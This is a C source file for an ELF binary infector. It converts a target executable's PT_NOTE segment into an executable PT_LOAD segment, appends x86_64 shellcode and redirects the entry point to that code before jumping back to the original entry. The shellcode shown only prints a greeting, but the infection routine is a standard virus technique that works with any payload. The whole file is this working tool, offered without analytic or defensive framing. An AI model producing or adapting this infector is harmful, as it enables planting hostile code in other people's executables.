#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <elf.h>
#include <sys/stat.h>

// Shellcode to print "hello world from pt_load\n"
// This is x86_64 assembly that uses syscall to write to stdout
// Preserves all registers and stack state before jumping to original entry
unsigned char shellcode[] = {
    // Save all callee-saved registers
    0x50,                               // push rax
    0x51,                               // push rcx
    0x52,                               // push rdx
    0x53,                               // push rbx
    0x56,                               // push rsi
    0x57,                               // push rdi
    0x55,                               // push rbp
    0x41, 0x50,                         // push r8
    0x41, 0x51,                         // push r9
    0x41, 0x52,                         // push r10
    0x41, 0x53,                         // push r11
    // write(1, message, message_len)
    0xb8, 0x01, 0x00, 0x00, 0x00,       // mov eax, 1 (sys_write)
    0xbf, 0x01, 0x00, 0x00, 0x00,       // mov edi, 1 (stdout)
    0x48, 0x8d, 0x35, 0x22, 0x00, 0x00, 0x00,  // lea rsi, [rip+0x22]  (message)
    0xba, 0x1a, 0x00, 0x00, 0x00,       // mov edx, 26 (message length)
    0x0f, 0x05,                         // syscall
    // Restore all registers
    0x41, 0x5b,                         // pop r11
    0x41, 0x5a,                         // pop r10
    0x41, 0x59,                         // pop r9
    0x41, 0x58,                         // pop r8
    0x5d,                               // pop rbp
    0x5f,                               // pop rdi
    0x5e,                               // pop rsi
    0x5b,                               // pop rbx
    0x5a,                               // pop rdx
    0x59,                               // pop rcx
    0x58,                               // pop rax
    // Jump to original entry point (will be patched with absolute address)
    0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs rax, original_entry (10 bytes)
    0xff, 0xe0,                         // jmp rax
    // Message: "hello world from pt_load\n"
    'h', 'e', 'l', 'l', 'o', ' ', 'w', 'o', 'r', 'l', 'd', ' ',
    'f', 'r', 'o', 'm', ' ', 'p', 't', '_', 'l', 'o', 'a', 'd', '\n', 0x00
};

typedef struct {
    char *file_data;
    size_t file_size;
    Elf64_Ehdr *elf_header;
    Elf64_Phdr *program_headers;
    size_t pt_note_offset;
    int pt_note_index;
    uint64_t original_entry;
} ElfData;

void read_elf_file(const char *filename, ElfData *data) {
    int fd = open(filename, O_RDONLY);
    if (fd == -1) {
        perror("Error opening file");
        exit(1);
    }

    struct stat st;
    if (fstat(fd, &st) == -1) {
        perror("Error getting file size");
        close(fd);
        exit(1);
    }

    data->file_size = st.st_size;
    data->file_data = malloc(data->file_size);
    if (!data->file_data) {
        perror("Memory allocation failed");
        close(fd);
        exit(1);
    }

    if (read(fd, data->file_data, data->file_size) != (ssize_t)data->file_size) {
        perror("Error reading file");
        free(data->file_data);
        close(fd);
        exit(1);
    }

    close(fd);
}

int validate_elf(ElfData *data) {
    if (data->file_size < sizeof(Elf64_Ehdr)) {
        fprintf(stderr, "File too small to be a valid ELF\n");
        return 0;
    }

    data->elf_header = (Elf64_Ehdr *)data->file_data;

    // Check ELF magic
    if (memcmp(data->elf_header->e_ident, ELFMAG, SELFMAG) != 0) {
        fprintf(stderr, "Not a valid ELF file\n");
        return 0;
    }

    // Check if it's 64-bit
    if (data->elf_header->e_ident[EI_CLASS] != ELFCLASS64) {
        fprintf(stderr, "Not a 64-bit ELF file\n");
        return 0;
    }

    return 1;
}

int find_pt_note(ElfData *data) {
    data->program_headers = (Elf64_Phdr *)(data->file_data + data->elf_header->e_phoff);
    data->pt_note_index = -1;

    for (int i = 0; i < data->elf_header->e_phnum; i++) {
        if (data->program_headers[i].p_type == PT_NOTE) {
            data->pt_note_index = i;
            data->pt_note_offset = data->elf_header->e_phoff + (i * sizeof(Elf64_Phdr));
            printf("Found PT_NOTE at index %d\n", i);
            return 1;
        }
    }

    fprintf(stderr, "No PT_NOTE segment found\n");
    return 0;
}

void create_infected_file(const char *output_filename, ElfData *data) {
    // Calculate new file size (original + shellcode)
    size_t new_file_size = data->file_size + sizeof(shellcode);
    char *output_data = malloc(new_file_size);
    if (!output_data) {
        perror("Memory allocation failed");
        exit(1);
    }

    // Copy original file
    memcpy(output_data, data->file_data, data->file_size);

    // Get pointers to the output data structures
    Elf64_Ehdr *out_elf_header = (Elf64_Ehdr *)output_data;
    Elf64_Phdr *out_program_headers = (Elf64_Phdr *)(output_data + out_elf_header->e_phoff);
    Elf64_Phdr *out_pt_note = &out_program_headers[data->pt_note_index];

    // Save original entry point
    data->original_entry = out_elf_header->e_entry;

    // Calculate new virtual address for the injected code
    // Place it at a high address to avoid conflicts
    uint64_t injection_vaddr = 0xc000000 + data->file_size;

    // Modify PT_NOTE to PT_LOAD
    out_pt_note->p_type = PT_LOAD;
    out_pt_note->p_flags = PF_R | PF_X;  // Readable and Executable
    out_pt_note->p_offset = data->file_size;  // Offset in file (at the end)
    out_pt_note->p_vaddr = injection_vaddr;
    out_pt_note->p_paddr = injection_vaddr;
    out_pt_note->p_filesz = sizeof(shellcode);
    out_pt_note->p_memsz = sizeof(shellcode);
    out_pt_note->p_align = 0x1000;  // Page alignment

    // Patch the shellcode with the original entry point
    // The address is at offset 56 (54 for start of movabs instruction + 2 for opcode)
    memcpy(shellcode + 56, &data->original_entry, sizeof(uint64_t));

    // Append shellcode to the end of file
    memcpy(output_data + data->file_size, shellcode, sizeof(shellcode));

    // Change entry point to point to our injected code
    out_elf_header->e_entry = injection_vaddr;

    // Write the output file
    int fd = open(output_filename, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd == -1) {
        perror("Error creating output file");
        free(output_data);
        exit(1);
    }

    if (write(fd, output_data, new_file_size) != (ssize_t)new_file_size) {
        perror("Error writing output file");
        close(fd);
        free(output_data);
        exit(1);
    }

    close(fd);
    free(output_data);

    printf("Successfully created infected file: %s\n", output_filename);
    printf("Original entry point: 0x%lx\n", data->original_entry);
    printf("New entry point: 0x%lx\n", injection_vaddr);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <input_elf> <output_elf>\n", argv[0]);
        return 1;
    }

    ElfData data;
    memset(&data, 0, sizeof(ElfData));

    printf("Reading ELF file: %s\n", argv[1]);
    read_elf_file(argv[1], &data);

    if (!validate_elf(&data)) {
        free(data.file_data);
        return 1;
    }

    if (!find_pt_note(&data)) {
        free(data.file_data);
        return 1;
    }

    create_infected_file(argv[2], &data);

    free(data.file_data);
    printf("Done!\n");

    return 0;
}
